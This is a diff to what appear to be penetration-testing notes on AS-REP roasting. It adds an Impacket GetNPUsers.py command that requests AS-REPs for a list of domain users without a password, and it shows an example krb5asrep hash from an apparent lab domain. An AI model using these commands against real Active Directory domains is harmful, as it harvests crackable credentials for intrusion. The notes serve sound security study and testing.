@@ -279,6 +279,13 @@ root@kali:~# impacket-GetNPUsers [domain].local/[username] -dc-ip [DC IP] -no-pa
 
 -> "-no-pass": tells Impacket to not prompt the attacker for a password because the attacker is only trying to request ASREPs.
 
+2. Alternatively, run against a full list of users (after finding users in the domain) like this:
+
+```shellscript
+root@kali:~# GetNPUsers.py [Domain].local/ -usersfile userlist.txt -dc-ip [DC IP] -no-pass
+
+```
+
 2. The hash may look like this example:
 
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:24ecdc664cfad5b0a81801ec58516730$3c55d8c2294c6606ee6d68def97564c303a82b243c9d52cb865070c4a2f0f837b2787b086a3849797276aaa5ea56f6cc7fe19499e625271daafcdbcbd7eb0a1fb8151075de82dc8ecbfac9c676a674f3f3355654e69e80892fa0237cd4fd80db0c79c0f9546b7715911bb7220c3d8d3c1fc68588360e6b57a0d1e3857ca4b4def8599d62e25e122a3e93d01677d8a42a608c3fc2f20e4bd6eb8b57f635e19cf94fa156579413ba7e6fd9bb01e98d7eb5cc13b5e2a2a8a9ed656d30494371b0a4e630dcf738cb0dc5fa2881597a0ea1236bddd3900f507474abc31cf87b79dd438667f90357d7051bba30000c077bd580af0f
